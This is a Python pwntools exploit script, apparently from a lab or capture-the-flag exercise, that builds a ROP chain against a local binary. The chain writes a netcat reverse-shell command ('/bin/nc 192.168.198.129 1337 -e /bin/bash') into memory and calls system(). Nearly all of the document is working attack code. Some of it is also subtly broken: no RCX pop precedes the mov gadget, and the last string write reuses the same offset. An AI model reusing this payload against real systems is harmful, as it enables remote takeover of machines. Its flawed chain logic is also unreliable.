from pwn import *
import requests

TARGET = "./target_two"
LIBC = "./LIBC_REMOTE"
OFFSET = cyclic_find(0x61776561)
log.info("Offset is %s", OFFSET)

thisElf = ELF(TARGET)
thisRop = ROP(thisElf)
POP_RCX = thisRop.find_gadget(["pop rcx"])[0]
POP_RDI = thisRop.find_gadget(["pop rdi"])[0]
POP_RSI = thisRop.find_gadget(["pop rsi"])[0]
POP_RBX = thisRop.find_gadget(["pop rbx"])[0]

RET = thisRop.find_gadget(["ret"])[0]
log.info("Pop RCX is %s", hex(POP_RCX))
log.info("Pop RDI is %s", hex(POP_RDI))
log.info("Pop RSI is %s", hex(POP_RSI))
log.info("Pop RBX is %s", hex(POP_RBX))


libcElf = ELF(LIBC)

SH = 0x0404000
MOV_GADGET = 0x040120d
#POP_RBX = 0x0401211

p = process(TARGET)

#Prompt user for Address
#7f9d57fc4000
libC_usr = ("7f9d57fc4000")
libC_Start = int(libC_usr, 16)
log.info("LibC Start is %s", hex(libC_Start))
#Set base addess of libC
libcElf.address = libC_Start
SYSTEM = libcElf.sym["system"]
log.info("Offset to System %s", hex(SYSTEM))


payload = b"A"*(OFFSET+2)
#0x000000000040120d: mov qword ptr [rbx], rcx; ret

payload += p64(POP_RBX)
payload += p64(SH)
payload += b'/bin/nc '
payload += p64(MOV_GADGET)

payload += p64(POP_RBX)
payload += p64(SH + 8)
payload += b'192.168.'
payload += p64(MOV_GADGET)

payload += p64(POP_RBX)
payload += p64(SH + 16)
payload += b'198.129 '
payload += p64(MOV_GADGET)

payload += p64(POP_RBX)
payload += p64(SH+24)
payload += b'1337 -e '
payload += p64(MOV_GADGET)

payload += p64(POP_RBX)
payload += p64(SH + 32)
payload += b'/bin/bas'
payload += p64(MOV_GADGET)

payload += p64(POP_RBX)
payload += p64(SH + 32)
payload += b'h\x00\x00\x00\x00\x00\x00\x00'
payload += p64(MOV_GADGET)

payload += p64(RET)
payload += p64(POP_RDI)
payload += p64(SH)
payload += p64(SYSTEM)

with open ("payload.txt", "wb") as x:
    x.write(payload)

p.interactive()